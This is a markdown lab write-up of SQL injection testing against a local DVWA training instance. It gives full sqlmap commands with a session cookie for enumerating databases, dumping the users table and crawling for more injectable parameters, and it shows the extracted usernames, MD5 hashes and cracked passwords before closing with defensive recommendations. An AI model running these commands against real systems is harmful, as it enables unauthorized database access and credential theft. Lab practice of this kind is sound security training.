# SQLMap Penetration Testing Documentation

## Overview

This document contains details about the SQL injection testing performed on the target application, steps taken, commands executed, and results obtained.

## Prerequisites

- **Target**: http://192.168.1.7/dvwa
- **Tools Used**: SQLMap
- **Setup**:
  - DVWA running on a local environment.
  - Security level set to `low`.

## Step 1: Identify Vulnerabilities

### Command:

```bash
sqlmap -u "http://192.168.1.7/dvwa/vulnerabilities/sqli/?id=1&Submit=Submit#" -p id --cookie "security=low; PHPSESSID=qhhbnclv8g0ummo85hrsjdr582; acopendivids=swingset,jotto,phpbb2,redmine; acgroupswithpersist=nada" --dbs
```

### Results:

- Identified injectable parameter: `id`.
- Databases discovered:
  - `dvwa`
  - `information_schema`

---

## Step 2: Select Target Database

### Command:

```bash
sqlmap -u "http://192.168.1.7/dvwa/vulnerabilities/sqli/?id=1&Submit=Submit#" -p id --cookie "security=low; PHPSESSID=qhhbnclv8g0ummo85hrsjdr582; acopendivids=swingset,jotto,phpbb2,redmine; acgroupswithpersist=nada" -D dvwa --tables
```

### Results:

- Tables in `dvwa` database:
  - `guestbook`
  - `users`

---

## Step 3: Dump Table Data

### Dumping `users` Table

#### Command:

```bash
sqlmap -u "http://192.168.1.7/dvwa/vulnerabilities/sqli/?id=1&Submit=Submit#" -p id --cookie "security=low; PHPSESSID=qhhbnclv8g0ummo85hrsjdr582; acopendivids=swingset,jotto,phpbb2,redmine; acgroupswithpersist=nada" -D dvwa -T users --columns
```

#### Results:

- Columns in `users` table:
  - `user_id`
  - `first_name`
  - `last_name`
  - `user`
  - `password`

---

### Dumping User Credentials

#### Command:

```bash
sqlmap -u "http://192.168.1.7/dvwa/vulnerabilities/sqli/?id=1&Submit=Submit#" -p id --cookie "security=low; PHPSESSID=qhhbnclv8g0ummo85hrsjdr582; acopendivids=swingset,jotto,phpbb2,redmine; acgroupswithpersist=nada" -D dvwa -T users --dump
```

#### Results:

- Extracted Data:
  | user_id | user | password | (decrypted password) | first_name | last_name |
  |---|---|---|---|---|---|
  | 1 | admin | 21232f297a57a5a743894a0e4a801fc3 | (admin) | admin | admin |
  | 2 | guest | e99a18c428cb38d5f260853678922e03 | (abc123) | Brown | Gordon |
  | 3 | 1337 | 8d3533d75ae2c3966d7e0d4fcc69216b | (charley) | Me | Hack |
  | 4 | pablo | 0d107d09f5bbe40cade3de5c71e9e9b7 | (letmein) | Picasso | Pablo |
  | 5 | smithy | 5f4dcc3b5aa765d61d8327deb882cf99 | (password) | Smith | Bob |
  | 6 | user | ee11cbb19052e40b07aac0ca060c23ee | (user) | user | user |

---

## Step 4: Test Other Parameters

#### Testing All Parameters:

```bash
sqlmap -u "http://192.168.1.7/dvwa/vulnerabilities/sqli/?id=1&Submit=Submit#" --cookie "security=low; PHPSESSID=qhhbnclv8g0ummo85hrsjdr582; acopendivids=swingset,jotto,phpbb2,redmine; acgroupswithpersist=nada" --crawl=3 --batch
```

### Results:

- Additional vulnerabilities found in `guestbook` table:
  - Columns dumped successfully.

---

## Recommendations

1. Implement input validation to prevent SQL injection.
2. Use parameterized queries or prepared statements.
3. Restrict database user privileges.
4. Regularly update and patch web applications and database management systems.
5. Utilize a Web Application Firewall (WAF) to detect and block SQL injection attempts.
